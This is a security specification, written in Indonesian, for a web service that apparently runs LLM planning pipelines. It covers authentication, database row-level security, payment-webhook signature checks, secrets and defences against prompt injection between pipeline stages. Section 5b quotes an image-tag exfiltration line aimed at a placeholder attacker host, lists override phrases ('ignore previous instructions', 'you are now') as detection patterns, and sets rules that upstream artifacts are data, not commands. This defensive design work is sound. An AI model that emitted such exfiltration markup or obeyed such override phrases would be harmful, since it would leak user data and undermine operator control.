# Security - PaluKetok

Tahap pipeline `security` juga menghasilkan artefak ini untuk setiap project. Dokumen ini adalah aturan keamanan untuk sistem PaluKetok itu sendiri.

Domain: `https://paluketok.web.id`.

## 1. Trust boundary

```
[Browser SvelteKit]  --(anon key + JWT)-->  [Go API]  --(service role / JEV key / LLM key / DOKU secret)-->  [Supabase Postgres, JEV, LLM, DOKU]
        ^                                      ^
   tidak dipercaya                      dipercaya (satu-satunya pemegang secret)
                                               ^
                                 [DOKU webhook] --(signature HMAC-SHA256)--
```

| Zona | Dipercaya? | Catatan |
|---|---|---|
| Browser | Tidak | Semua input divalidasi ulang di Go. |
| Go API | Ya | Satu-satunya tempat secret. |
| Postgres | Ya, dengan RLS | RLS = lapis kedua. |
| JEV | Ya untuk keputusan, tidak untuk isi | Output JEV dipakai sebagai pilihan gate, bukan instruksi. |
| LLM | Tidak | Output divalidasi format sebelum disimpan. |
| DOKU webhook | Tidak sampai signature valid | Lihat bagian 6. Signature satu-satunya gerbang; DOKU melarang URL notifikasi memakai auth/VPN/ngrok. |
| Isi brief dan artefak LLM | Tidak | Data, bukan instruksi. Lihat bagian 5. |

## 2. Autentikasi (JWT, JWKS)

- Middleware Go memverifikasi JWT Supabase di setiap route user-scoped. Gagal = `401 unauthorized`.
- Verifikasi via JWKS (asymmetric). Tanpa `SUPABASE_JWT_SECRET`.
- Wajib cek: `kid` ada di JWKS, `exp`, `aud = "authenticated"`, `iss = https://<project>.supabase.co/auth/v1`.
- Allowlist algoritma (`RS256`, `ES256`). Tolak `alg: none` dan algoritma lain.
- Cache JWKS. Refresh saat `kid` tidak dikenal, dengan batas frekuensi refresh.
- Role dan `sub` hanya dari claim JWT, tidak dari body atau query.
- Admin ditentukan dari `profiles.is_admin` yang dibaca server, bukan dari claim klien.

## 3. Otorisasi (3 lapis)

| Lapis | Mekanisme | Gagal |
|---|---|---|
| 1 | JWT valid | 401 |
| 1b | Sesi hidup bisa dicabut: `profiles.token_version` dibanding claim `token_version` | 401 |
| 2 | Handler/usecase cek `owner_id == actor.id` atau `actor.is_admin` | 403 |
| 3 | RLS Postgres: `owner_id = auth.uid()` | query kosong / 403 |

Aturan tambahan:

- Tidak ada endpoint yang menerima `owner_id` atau `is_admin` dari klien.
- `plan_runs`, `artifacts`, `decisions` menyimpan `user_id` (denormalisasi) agar policy RLS tidak perlu join.
- RLS dinyalakan DAN dipasang policy. `ALTER TABLE ... ENABLE ROW LEVEL SECURITY` saja tidak cukup: selama grant default Supabase ke role `anon`/`authenticated` belum dicabut, PostgREST tetap bisa dibaca langsung dari internet.
  - `REVOKE ALL ON ALL TABLES IN SCHEMA public FROM anon, authenticated;` kecuali tabel yang memang publik.
  - Policy baca/tulis `USING (user_id = auth.uid()) WITH CHECK (user_id = auth.uid())` untuk `plan_runs`, `artifacts`, `decisions`, `projects` (lewat `owner_id`).
  - `profiles`: baca hanya baris sendiri; `UPDATE` hanya kolom yang boleh (`username`, `full_name`), `is_admin` dan `credits` TIDAK boleh lewat PostgREST — cabut grant `UPDATE` dan hanya ubah lewat server (service role).
  - `ai_settings`, `credits_ledger`: nol akses dari `anon`/`authenticated`, hanya service role.
  - `artifact_versions`: policy lewat join `artifact_id IN (SELECT id FROM artifacts WHERE user_id = auth.uid())`.
  - Tanpa policy, RLS default menolak semua. Jadi ini wajib, bukan opsional.
- Service role key hanya dipakai server. Lewat service role RLS dilewati, jadi setiap query wajib filter `owner_id`/`user_id` manual.
- Setiap 403 dicatat ke log dengan `user_id`, `route`, `resource_id`.


## 4. Validasi input

| Field | Aturan |
|---|---|
| `projects.name` | 1-120 karakter, trim, tanpa karakter kontrol |
| `projects.brief` | 1-8.000 karakter (batas biaya token dan prompt) |
| `projects.stack` | JSON object, key hanya `fe`, `be`, `db`, `payment`; nilai dari whitelist enum |
| `status` project | enum `draft / ready / archived` |
| `run_id`, `artifact_id`, `order_id` | UUID valid, cek format sebelum query |
| Body JSON | Tolak field tak dikenal (`DisallowUnknownFields`), batas 64 KB |
| `decisions?run_id=` | wajib, UUID, dicek owner |
| `ai_settings.base_url` | HTTPS wajib, tanpa `localhost` di produksi. Host harus ada di allowlist admin. Client Go memakai `CheckRedirect` yang menolak redirect lintas host |
| `ai_settings.slot` | whitelist. Saat ini hanya `planner` |

Error validasi: `422 validation_error`, pesan tidak membocorkan nama tabel atau query.

## 5. Keamanan prompt (LLM)

- Brief dan isi artefak lama masuk prompt sebagai blok data yang diberi tanda jelas, bukan instruksi sistem.
- Prompt sistem menyatakan bahwa isi brief tidak boleh mengubah format output, role, atau aturan.
- Output tiap tahap divalidasi sebelum disimpan (`plan/planner.md` bagian 5). Output gagal validasi tidak masuk `artifacts`.
- Tidak ada output LLM yang dieksekusi. Sistem menghasilkan dokumen, bukan kode yang dijalankan.

### 5b. Prompt injection berantai antar tahap (WAJIB)

Artefak tahap N menjadi input tahap N+1. Isinya keluaran LLM, jadi TIDAK tepercaya. Aturan yang mengikat:

1. **Batas peran eksplisit.** Prompt tiap tahap memuat artefak hulu di dalam delimiter tetap (`<artefak_hulu>...</artefak_hulu>`) dengan instruksi sistem: isi di dalam delimiter adalah DATA, bukan perintah. Instruksi dari klien atau dari artefak tidak pernah menimpa instruksi tahap.
2. **Sanitasi keluaran sebelum disimpan dan sebelum dipakai tahap berikutnya.** Buang tag HTML mentah (`<img`, `<script`, `<iframe`, `<a href`), URL absolut, dan data-URI dari `artifacts.content`. Simpan versi bersih; versi mentah tidak dipakai tahap lanjut. Ini menutup jalur exfil `<img src=http://attacker/?d=...>`.
3. **Validasi makna, bukan cuma format.** `planner.md` bagian 5 memvalidasi format (JSON, field wajib). Tambahan wajib: keluaran LLM yang memuat instruksi-instruksi ("abaikan instruksi sebelumnya", "kamu sekarang adalah", permintaan mengirim data ke URL) ditandai dan run dihentikan sebagai `failed` dengan alasan `unsafe_output`. Tanpa ini, validasi format lolos.
4. **Tidak ada aksi keluar dari isi artefak.** Artefak tidak pernah menentukan model, `base_url`, tool, atau endpoint yang dipanggil. Semua itu dari `ai_settings` dan kode server.
5. **Batas ukuran.** Artefak disimpan dengan batas panjang eksplisit; keluaran melebihi batas dipotong di batas kata dan ditandai di `decisions`.

## 6. Webhook DOKU

Endpoint: `POST /v1/webhooks/doku`. Tidak memakai JWT, dilindungi signature HMAC-SHA256.
Signature adalah SATU-SATUNYA gerbang: docs DOKU melarang URL notifikasi memakai
authentication, VPN, localhost, dan domain ngrok, dan tidak menyediakan IP allowlist
untuk notifikasi. Karena itu verifikasi tidak boleh punya jalur bypass.

Komponen signature (docs `signature-component/non-snap`):

```
Client-Id:<nilai header Client-Id>
Request-Id:<nilai header Request-Id>
Request-Timestamp:<nilai header Request-Timestamp>
Request-Target:<path URL notifikasi, mis. /v1/webhooks/doku>
Digest:<base64(SHA256(body mentah))>
```

Digabung dengan `
`, TANPA `
` di akhir, lalu HMAC-SHA256 base64 memakai
`DOKU_SECRET_KEY`. Header kiriman DOKU bernilai `Signature: HMACSHA256=<base64>`.
Catatan: DOKU TIDAK mengirim header `Digest`; Digest dihitung sendiri dari body mentah.

Urutan wajib:

1. Baca body MENTAH, batas 16 KB. Digest dihitung dari byte mentah ini, bukan dari hasil parse ulang.
2. Ambil `Client-Id`, `Request-Id`, `Request-Timestamp`, `Signature` dari header. Header kurang = `401`, tanpa perubahan data.
3. Cocokkan `Client-Id` dengan `DOKU_CLIENT_ID`. Beda = `401`.
4. Susun komponen seperti di atas dengan `Request-Target` = path notifikasi yang TERDAFTAR di Back Office. Path harus sama persis; ketidakcocokan membuat semua signature gagal.
5. Hitung HMAC-SHA256 base64, bandingkan dengan header memakai `hmac.Equal` (constant time). Tidak cocok = `401`, tanpa perubahan data.
6. JANGAN memakai umur `Request-Timestamp` sebagai gerbang tolak. DOKU mengulang notifikasi sampai +12 jam (30 menit, 5,5 jam, 12 jam), jadi notifikasi sah bisa berumur tua. Umur timestamp hanya dicatat untuk observasi. Anti-replay memakai langkah 8.
7. Cari `orders` berdasarkan `invoice_number`. Tidak dikenal = `404`, tanpa perubahan data.
8. Idempotensi: kunci `request_id` (unique). `request_id` yang sudah pernah diproses = balas `200` tanpa perubahan. Ini yang menutup duplikat dan replay.
9. Cabang status:
   - `transaction.status = SUCCESS` -> cocokkan `order.amount` dengan `orders.amount_idr`, lalu `SELECT ... FOR UPDATE` pada order, ubah status dengan `UPDATE ... WHERE status = 'pending'`, tambah `credits_ledger` dalam transaksi yang sama.
   - `transaction.status = FAILED` -> DIABAIKAN. Checkout memungkinkan pelanggan ganti metode bayar, jadi FAILED bukan status akhir. Tanpa perubahan data.
   - `order.status = ORDER_EXPIRED` -> tandai order `expire`, tanpa kredit. Status kedaluwarsa ada di `order.status`, BUKAN di `transaction.status`.
   - `order.status = ORDER_RECOVERED` -> tidak diaktifkan di v1 (`recover_abandoned_cart` tidak dipakai). Bila muncul, catat dan balas `200`.
10. Balas `200` hanya setelah commit. Balasan harus cepat: DOKU hanya butuh 2xx, dan kerja berat dilakukan setelah commit.

Late settlement: order `expire` yang kemudian dibayar boleh pindah ke `settlement` hanya
jika status API DOKU mengonfirmasi `SUCCESS`.

Pemanggilan DOKU keluar memakai `http.Client` dengan timeout 20 detik, tanpa auto-retry.
Untuk cek status, GET `https://api.doku.com/orders/v1/status/{invoice_number}`. Jangan
memanggil cek status dalam 60 detik pertama setelah pembayaran.

## 7. Kredit dan konkurensi

- Invariant: saldo tidak boleh negatif (`CHECK (credits >= 0)`), dan dua request run bersamaan dari user yang sama tidak boleh melewati saldo.
- Jaminan: `SELECT ... FOR UPDATE` pada baris `profiles` di dalam satu transaksi. Urutan langkah: `auth_billing.md` bagian 3.
| `profiles.credits` adalah cache dari `sum(credits_ledger.delta)`. Rekonsiliasi lewat query. |
| `profiles.token_version` dicocokkan dengan claim JWT `token_version`. Tidak sama = `401` (lapis 1b, `security.md` bagian 3). |

## 8. Rate limit dan biaya

| Scope | Batas awal | Aksi saat lewat |
|---|---|---|
| Per user, `POST /runs` | 5 request / menit | `429 rate_limited` |
| Per user, endpoint lain | 60 request / menit | `429 rate_limited` |
| Per admin, `/v1/admin/*` | 30 request / menit | `429 rate_limited` |
| Global JEV | sesuai kuota gateway, dijaga di server | `503 unavailable` saat antrean penuh, bukan retry JEV |
| Webhook | tanpa batas per user, body max 16 KB | - |

- Rate limit disimpan di memori proses (monolith satu proses). Jika scale out, pindah ke Postgres atau Redis dan catat sebagai keputusan baru.
- Timeout dan retry JEV: lihat `planner.md` bagian 4.

## 9. Secret dan konfigurasi

| Secret | Lokasi | Dipakai oleh |
|---|---|---|
| `SUPABASE_SERVICE_ROLE_KEY` | `server/.env` | Go saja |
| `SUPABASE_URL` | `server/.env` | Go, issuer dan JWKS |
| `JEV_API_KEY` | `server/.env` | Go saja, `adapter/judge` |
| `DOKU_SECRET_KEY` | `server/.env` | Go saja |
| LLM API key (`ai_settings.api_key`) | DB, plaintext (keputusan) | Go saja. GET API hanya kirim masked |
| `SUPABASE_ANON_KEY` | `web/.env` | Browser, boleh publik |
| `DOKU_CLIENT_ID` | `server/.env` (bukan rahasia, tapi tetap di server) | Go saja |

- `.env` masuk `.gitignore`. `server/.env.example` hanya berisi nama variabel dengan placeholder.
- Key yang pernah tertulis di dokumen wajib di-rotate. JEV key di `plan/jev_ai.md` masuk daftar ini.
- Log tidak boleh memuat token, signature, server key, API key LLM, atau isi brief penuh.

## 10. HTTP dan frontend

- CORS: hanya origin `https://paluketok.web.id`, `https://admin.paluketok.web.id`, dan `http://localhost:<port>` saat dev. Tidak memakai wildcard.
- Header: `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`.
- Artefak markdown dirender dengan sanitizer. HTML mentah dari LLM tidak dirender.
- Pesan error ke klien tidak memuat stack trace. `500` hanya `{"error":{"code":"internal","message":"Terjadi kesalahan"}}`. Detail masuk log server.
- Middleware `recover` menangkap panic dari handler dan worker. Panic di worker menandai run `failed`, bukan membuat proses mati.

## 11. Worker dan goroutine

- Setiap tahap punya `context.WithTimeout`. Pembatalan run menghentikan goroutine.
- Worker pool ukuran tetap. Antrean penuh = `503`, bukan goroutine tak terbatas.
- Shutdown: tunggu run yang berjalan sampai batas waktu, lalu tandai sisanya `failed` dengan `error = "server_restart"`. Kredit di-refund.
- Start: run `queued` dimasukkan ulang ke antrean. Run `running` dari proses sebelumnya ditandai `failed` dengan `server_restart` dan di-refund, lalu user bisa mulai ulang.

## 12. Audit

Dicatat ke `decisions` (keputusan JEV) dan `credits_ledger` (uang). Deny 403 dan webhook gagal dicatat ke log server. Tabel audit terpisah ditunda.

## 13. Checklist sebelum rilis

- [ ] Semua route user-scoped punya middleware JWT.
- [ ] Setiap query service role memfilter owner.
- [ ] RLS aktif DAN policy terpasang di semua tabel app; grant `anon`/`authenticated` dicabut. Ada tes yang membuktikan user A tidak bisa baca data user B, dan user biasa tidak bisa `PATCH /rest/v1/profiles` untuk set `is_admin` atau `credits`.
- [ ] Index penjaga uang (`uq_ledger_one_refund_per_run`, `uq_ledger_one_topup_per_order`, `uq_ledger_one_refund_per_charge`, `uq_ledger_one_grant_per_key`) ada dan diuji: percobaan dobel ditolak DB.
- [ ] `ai_settings.base_url` ada di allowlist host dan client menolak redirect lintas host.
- [ ] Webhook menolak signature salah dan nominal tidak cocok.
- [ ] Key lama sudah di-rotate.
- [ ] `.env` tidak masuk git.
- [ ] Tidak ada log yang memuat secret.
